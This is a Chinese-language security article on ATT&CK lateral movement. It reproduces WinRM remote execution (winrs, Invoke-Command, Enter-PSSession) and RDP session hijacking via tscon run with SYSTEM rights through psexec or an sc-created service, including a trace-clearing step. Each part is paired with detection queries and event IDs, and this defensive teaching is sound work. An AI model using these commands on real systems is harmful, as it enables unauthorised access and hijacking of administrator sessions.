# **ATT &CK攻防初窥系列--横向移动篇（一）** ****

之前的文章介绍了ATT
&CK执行篇中Control和XSL的用法。在网络攻防中，执行往往发生在进入入口后的初始阶段，而横向移动则发生在中间阶段。横向移动的目的是根据已有条件扩大攻击成果。下面我们将会像大家展示ATT&CK中罗列的横向移动手法的运用和检测。

#  **T1028-Windows Remote Management** ****

在介绍Windows Remote Management(Winrm)之前，首先要介绍WS-Management（Web服务器管理协议）。WS-Management协议是一种基于SOAP协议的DMTF开放标准，用于对服务器等网络设备进行管理。WinRM是windows对于该协议的一种实现。

根据微软官方文档介绍:

1、WinRM服务将在Windows Server 2008上自动启动。在Windows Vista上，该服务必须手动启动。

2、默认情况下，未配置WinRM [_侦听_](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary)器。即使WinRM服务正在运行，也无法接收或发送请求数据的WS-Management协议[
_消息_](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary)。

3、Internet连接防火墙（ICF）阻止访问端口。

通过administrator权限使用下面命令可以打开上述限制条件，开启winrm服务并监听端口

winrm quickconfig

![1.png](https://image.3001.net/images/20191126/1574765430_5ddd0376e08c0.png!small)

winrm e winrm/config/listener #查看监听情况

![2.png](https://image.3001.net/images/20191126/1574765468_5ddd039caa3eb.png!small)

可以看到现在winrm开启了5985进行监听并使用HTTP协议进行传输，而ListeningOn字段则是监听的ip地址(都是自身ip地址)。

配置好服务端之后如果我们尝试通过客户端连接服务端进行远程代码执行的时候会出现如下报错

![3.png](https://image.3001.net/images/20191126/1574765500_5ddd03bc91d40.png!small)

原因是winrm客户端维护这一个信任主机列表只有在信任主机列表中的服务端才允许连接。

winrm set winrm/config/client @{TrustedHosts="*"}

测试远程服务器是否开启winrm

Test-WsMan 10.50.1.208 #在powershell中执行

![4.png](https://image.3001.net/images/20191126/1574765523_5ddd03d3f3029.png!small)

##  **技术复现** ****

###  **横向移动(winrs)** ****

winrs -r:<http://10.50.1.208:5985> -u:administrator -p:xxxxxxxx ipconfig

![5.png](https://image.3001.net/images/20191126/1574765565_5ddd03fda411c.png!small)

###  **横向移动(Invoke-Command)** ****

Invoke-Command -ComputerName 10.50.1.208 -ScriptBlock {ipconfig} -credential
administrator #ComputerName后可以跟ip或者计算机名

![6.png](https://image.3001.net/images/20191126/1574765588_5ddd04143537a.png!small)

验证成功后输出ipconfig命令内容

![7.png](https://image.3001.net/images/20191126/1574765607_5ddd04275d264.png!small)

###  **横向移动(Enter-PSSession)** ****

Enter-PSSession -ComputerName 10.50.1.208 -Credential administrator

![8.png](https://image.3001.net/images/20191126/1574765633_5ddd044198377.png!small)

验证成功后弹回远程主机的powershell

![9.png](https://image.3001.net/images/20191126/1574765645_5ddd044dbc115.png!small)

##  **威胁检测** ****

 **数据源** :文件监视，身份验证日志，网络连接监视，进程监视，进程命令行参数

###  **WINRM流量特征** ****

通过对winrs、Enter-PSSession、Invoke-Command通信流量抓包发现其通信特征相同，都是通过请求<http://xxx.xxx.xxx.xxx/wsman>
来进行验证和下发命令。并且即使WinRM是使用http通信的但是其通信内容也是加密的，加密的protocal为"application/HTTP-SPNNEG-session-encrypted"

User-Agent contains "Microsoft WinRM Client" AND Content-Type contains "HTTP-SPNNEG-session-encrypted" AND Content-Type contains "Encrypted Boundary"

![10.png](https://image.3001.net/images/20191126/1574765686_5ddd0476a06dd.png!small)

###  **WINRM客户端** ****

#winrm客户端产生4656日志  
eventNum:4656

![11.png](https://image.3001.net/images/20191126/1574765706_5ddd048a6f337.png!small)

 **网络特征:** （级别：高）

sysmon检测到powershell或者winrs.exe发起的网络连接信息

eventNum:3 AND DestinationPort:5985 AND (Image contains:"powershell.exe" OR
Image contains:"winrs.exe")

![12.png](https://image.3001.net/images/20191126/1574765743_5ddd04af4e384.png!small)

![13.png](https://image.3001.net/images/20191126/1574765895_5ddd054794d72.png!small)  

 **进程特征:** （级别：高）

sysmon检测到到winrm.vbs的进程创建

eventNum:1 AND CommandLine contains winrm.vbs

 **命令行参数特征:** （级别：高）

CommandLine contains "Invoke-Command" OR CommandLine contains "Enter-PSSession" OR Image contains "winrs.exe"

###  **WINRM服务端** ****

 **进程特征:** （级别高）

在使用winrm执行远程命令时，目标机器会启动一个winrshost.exe来执行远程命令。

eventNUm:1 AND ParentImage contains "winrshost.exe"

![14.png](https://image.3001.net/images/20191126/1574765833_5ddd0509caf3d.png!small)

#  **T1076 Remote Desktop Protocol** ****

远程桌面是操作系统中的常见功能。它允许用户使用远程系统上的系统桌面图形用户界面登录到交互式会话。Microsoft将其对远程桌面协议（RDP）的实现称为远程桌面服务（RDS）。

如果启用了服务并允许访问具有已知凭据的帐户，则攻击者可以通过RDP /
RDS连接到远程系统以扩展访问权限。攻击者可能会使用凭据访问技术来获取与RDP一起使用的凭据。攻击者还可以结合使用RDP和[可访问性功能](https://attack.mitre.org/techniques/T1015)技术来实现持久性。

攻击者还可能执行RDP会话劫持，其中涉及窃取合法用户的远程会话。通常情况下当其他人试图窃取其会话(可以理解为windows的快速切换用户功能)时会收到问题提示并要求出示密码。凭借系统权限(SYSTEM权限)的终端服务控制台
**c:\windows\system32\tscon.exe [session number to be stolen]**
，攻击者可以切换会话而无需输入密码。这可能导致攻击者窃取域管理员或更高特权的账户会话。

##  **技术复现** ****

前置条件：拥有某个本地管理员组账号的权限

目的：通过rdp会话劫持使我们可以从该管理员组账号切换到本机任意一个账户的rdp会话中

以一台域控制器(10.50.1.208)为例，我们获取了其本地管理员组一个用户(huahua)的凭据。

![15.png](https://image.3001.net/images/20191126/1574765970_5ddd059288403.png!small)

![16.png](https://image.3001.net/images/20191126/1574766006_5ddd05b6f1d6e.png!small)

###  **横向移动(PSExec）** ****

psexec.exe -s cmd #获取SYSTEM权限的shell

![17.png](https://image.3001.net/images/20191126/1574766034_5ddd05d26abc8.png!small)

query user #查看当前存在的会话

tscon 2 /dest:rdp-tcp#0 #2为administrator的会话id，rdp-tcp#0为我们当前会话名

![21.png](https://image.3001.net/images/20191126/1574766298_5ddd06dae21f7.png!small)

可以看到我们已经成功切换到了域管理员的会话中。

###  **横向移动(SC）** ****

原理为使用sc命令实现执行SYSTEM权限的命令

query user #查看当前存在的会话  
sc create huahua binPath= "tscon 2 /dest:rdp-tcp#0"  
sc start huahua

![20.png](https://image.3001.net/images/20191126/1574766221_5ddd068d2573a.png!small)

![21.png](https://image.3001.net/images/20191126/1574766298_5ddd06dae21f7.png!small)  

sc delete huahua #清除痕迹

##  **威胁检测** ****

###  **进程特征** ****

通过tscon.exe实现RDP劫持的前提为执行tscon.exe的用户权限为SYSTEM，可以通过检测新创建的tscon.exe进程的User是否为SYSTEM来判断是否发生了可疑的RDP劫持。

Image contains "tscon.exe" AND USER contains "NT AUTHORITY\\\SYSTEM"

![22.png](https://image.3001.net/images/20191126/1574766329_5ddd06f91cf26.png!small)

当使用rdp会话劫持切换用户时安全日志会出现4778、4779两条安全日志

![23.png](https://image.3001.net/images/20191126/1574766355_5ddd0713afe43.png!small)

_![24.png](https://image.3001.net/images/20191126/1574766366_5ddd071e2bb10.png!small)_

